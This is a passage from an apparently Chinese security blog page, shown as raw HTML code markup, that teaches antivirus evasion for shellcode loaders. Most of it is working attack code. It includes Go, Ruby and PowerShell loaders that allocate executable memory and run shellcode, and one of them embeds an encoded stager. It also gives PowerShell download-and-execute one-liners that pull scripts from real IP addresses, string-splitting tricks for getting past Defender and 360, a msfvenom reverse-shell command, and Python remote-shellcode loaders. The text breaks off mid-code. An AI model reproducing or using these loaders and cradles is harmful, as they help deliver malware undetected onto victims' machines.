class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">package main</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;syscall&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;unsafe&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">const</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">MEM_COMMIT             = <span class="number">0x1000</span></span></span></span><br><span class="line"><span class="params"><span class="function">MEM_RESERVE            = <span class="number">0x2000</span></span></span></span><br><span class="line"><span class="params"><span class="function">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">var</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">VirtualAlloc  = kernel<span class="number">32.</span>MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">xor_shellcode := []byte&#123;<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>...&#125;</span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.<span class="built_in">Call</span>(<span class="number">0</span>, <span class="built_in">uintptr</span>(<span class="built_in">len</span>(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; err.<span class="built_in">Error</span>() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.<span class="built_in">Exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err = RtlCopyMemory.<span class="built_in">Call</span>(addr, (uintptr)(unsafe.<span class="built_in">Pointer</span>(&amp;xor_shellcode[<span class="number">0</span>])), <span class="built_in">uintptr</span>(<span class="built_in">len</span>(xor_shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; err.<span class="built_in">Error</span>() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.<span class="built_in">Exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.<span class="built_in">Syscall</span>(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实原理与上面python或者C/C++类似。</p><p>通过声明匿名函数,然后指向读入的ShellCode字节数据的那片内存，并将内存设置为可读可写可执行，之后调用函数就将ShellCode运行起来了。</p><p>可以利用加密混淆shellcode，也可以利用不同的加载器代码去写加载器、、</p><p>加壳工具（SafengineShielden）</p><h4 id="内联C加载">内联C加载</h4><p>核心代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    buf := <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="built_in">byte</span>(buf)</span><br><span class="line">    C.<span class="built_in">call</span>((*C.<span class="type">char</span>)(unsafe.<span class="built_in">Pointer</span>(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="powershell">powershell</h3><p>手工混淆：</p><p>填充垃圾数据</p><p>直接在base64编码上添加，然后解码前进行还原（为了让杀毒判断失效）</p><p>直接在原型代码上添加，然后解码还原（可过火绒）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0RE1pTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNZEVkcGRDUHBpT3BMK0syTmJQYmk3dEtzYUpQRXhPMXBOQ1hyTjI1Tlo1SWdGUFdxU1lNdmtwZ0lYdTNENEI4S2tXaTc1WlhtQ2gzVFJEZjUrY1pORTFQWEFOaTVHNUhLdW5TYTZFVXNJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM1JLVFJVWEdBTmJGUmNZQTNkUlNrZEdUVmNNRmcwVEdBTnVZbUoyR0FOdGN4TWJDaTRwSTZhV3gzU1R3Q1YxVFBVbTcyWVpDa2p0WlB3VnJHeUtvcnNWRmIybzlkRTM3Y3BXaW1WbElSNU94SXBRWGdOVGZsLzVNVHVaQkZYRnJVTlpZWWdreld1T3NMb2t2Q0JjZUJuWE13MStpVWRublFqRnpLRGhJZklyMDN4bGlGYm1Kaksrb1h6MTJGZEt3WmVubUtWeHZKV0lQQXJsLzU3S1RDVjdSQnJ2RENVUlIyM0NQK3RnNGo2eXdCRjJ1bFNmcWkwT1Z0THVIbnkwQnNXcTJHbFkyNUQ5UVdQbW94WkdZUElhSTYyeG5zVW5IVjVaTmhPb1BuS055cVA5Y2VuZVU5YlpDQVp2dzJKYzNTTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNGeEFORWhBYkRSRVVEUklSSTJxMUlmRT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$z</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$DoIt</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$z</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$z</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bb</span>=[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x</span>))</span><br><span class="line">powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> hr.ps1</span><br><span class="line"></span><br><span class="line">填充垃圾数据</span><br><span class="line">直接在base64编码上添加，然后解码前进行还原（为了让杀毒判断失效）</span><br><span class="line">直接在原型代码上添加，然后解码还原</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">项目混淆：<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">https://github.com/danielbohannon/<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">加载模块：<span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line">运行程序：<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">处理文件：<span class="built_in">set</span> scriptpath C:\Users\<span class="number">86135</span>\Desktop\<span class="number">1</span>.ps1</span><br><span class="line">处理代码：<span class="built_in">set</span> scriptblock <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">进入编码：encoding</span><br><span class="line">选择编码：<span class="number">1</span><span class="literal">-8</span></span><br><span class="line">输出文件：out C:\Users\<span class="number">86135</span>\Desktop\<span class="number">11</span>.ps1</span><br></pre></td></tr></table></figure><h5 id="分离免杀">分离免杀</h5><p>通过将shellcode放在web端，利用加载器去下载执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span>= ((<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;http://47.94.236.117/1.txt&#x27;</span>))</span><br><span class="line">解码：</span><br><span class="line"><span class="variable">$x</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$d</span>))</span><br><span class="line"></span><br><span class="line">http://<span class="number">47.94</span>.<span class="number">236.117</span>/<span class="number">1</span>.txt  =  <span class="variable">$d</span> base64数据</span><br><span class="line"><span class="variable">$d</span>= ((<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;http://47.94.236.117/1.txt&#x27;</span>))</span><br><span class="line"><span class="variable">$x</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$d</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PowerShell-文件模式-特征修改过DeFender（过不了火绒）">PowerShell-文件模式-特征修改过DeFender（过不了火绒）</h4><p><a href="https://www.cnblogs.com/zzjdbk/p/14380138.html">https://www.cnblogs.com/zzjdbk/p/14380138.html</a></p><p>Fuzz DF查杀特征</p><p>1、Shellcode换格式</p><p>2、变量名&amp;函数名全修改</p><p>将shellcode转换成字节形式，将变量名函数名换成自定义的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="variable">$s</span> = [<span class="built_in">Byte</span>[]]<span class="variable">$var_code</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;【cs生成的shellcode】&#x27;</span>)</span><br><span class="line"><span class="variable">$s</span> |<span class="keyword">foreach</span> &#123; <span class="variable">$string</span> = <span class="variable">$string</span> + <span class="variable">$_</span>.ToString()+<span class="string">&#x27;,&#x27;</span>&#125;</span><br><span class="line"><span class="variable">$string</span> &gt; D:\<span class="number">2</span>.txt  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接命令执行上线如果被提示，可以通过以下方法</p><p>3、垃圾数据干扰：</p><p>powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString(‘ht’+‘tp://43.138.27.12:8880/2.ps1’)</p><p>4.通过copy powershell.exe程序 到当前文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">替换文件名：</span><br><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe bypass.txt</span><br><span class="line">bypass.txt <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.也可以将脚本命令转换为exe程序进行绕过</p><p>6.对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做一些处理。<br>比如利用replace替换函数，可以bypass。</p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoExit</span> <span class="string">&quot;<span class="variable">$c1</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="variable">$c2</span>=&#x27;123(&#x27;&#x27;http://10.211.55.2/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="variable">$c1</span>+<span class="variable">$c2</span>)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="汇编代码免杀绕过">汇编代码免杀绕过</h3><p>参考：</p><p><a href="https://forum.butian.net/share/1536">https://forum.butian.net/share/1536</a></p><h3 id="java免杀（静态）">java免杀（静态）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、JAR包源码特征修改免杀</span><br><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f jar -o msf.jar</span><br><span class="line">-Jar反编译导出-jdgui</span><br><span class="line">-修改上线配置-config</span><br><span class="line">-修改启动主类-MANIFEST.MF</span><br><span class="line">-修改执行代码-Main.java</span><br><span class="line">-打包class-javac Main.java</span><br><span class="line">-编译jar-jar cvfm xiaodi.jar META-INF/MANIFEST.MF .</span><br><span class="line"></span><br><span class="line">2、JAR包打包EXE执行免杀</span><br><span class="line">安装：exe4j Inno进行打包</span><br><span class="line">exe4j-下载链接：https://exe4j.apponic.com/</span><br><span class="line">inno-下载链接：https://jrsoftware.org/isdl.php</span><br><span class="line">操作说明：https://www.jb51.net/article/236000.htm</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Ruby免杀：">Ruby免杀：</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/import&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/types&#x27;</span> </span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">include</span> <span class="title class_">Fiddle</span> </span><br><span class="line">kernel32 = <span class="title class_">Fiddle</span>.dlopen(<span class="string">&#x27;kernel32&#x27;</span>) </span><br><span class="line">ptr = <span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;VirtualAlloc&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, shellcode.size, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;VirtualProtect&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(ptr, shellcode.size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">buf = <span class="title class_">Fiddle</span><span class="symbol">:</span><span class="symbol">:Pointer</span>[shellcode] </span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;RtlMoveMemory&#x27;</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>],<span class="number">4</span>).call(ptr, buf, shellcode.size)</span><br><span class="line">thread = <span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;CreateThread&#x27;</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) </span><br><span class="line"><span class="title class_">Function</span>.new(kernel32[<span class="string">&#x27;WaitForSingleObject&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(thread, ‐<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="无文件落地（加载器分离）">无文件落地（加载器分离）</h3><p><a href="https://www.freebuf.com/articles/compliance/290379.html">https://www.freebuf.com/articles/compliance/290379.html</a></p><h4 id="Python-File-将shellcode从文本中提取">Python-File-将shellcode从文本中提取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;s.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s=f.read()</span><br></pre></td></tr></table></figure><h4 id="Python-Argv-将shellcode与加载器分离">Python-Argv-将shellcode与加载器分离</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">核心代码：</span><br><span class="line">z=sys.argv[<span class="number">1</span>]</span><br><span class="line">zx=base64.b64decode(z)</span><br><span class="line"><span class="built_in">exec</span>(zx)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Python-Http-将shellcode用远程协议加载">Python-Http-将shellcode用远程协议加载</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">all</span>=requests.get(<span class="string">&#x27;http://www.xxxx.com/all.txt&#x27;</span>).text</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Python-Socket-将shellcode通过管道传输">Python-Socket-将shellcode通过管道传输</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">参考：https://www.cnblogs.com/Keep-Ambition/p/<span class="number">7459213.</span>html</span><br><span class="line"><span class="keyword">def</span> <span class="title 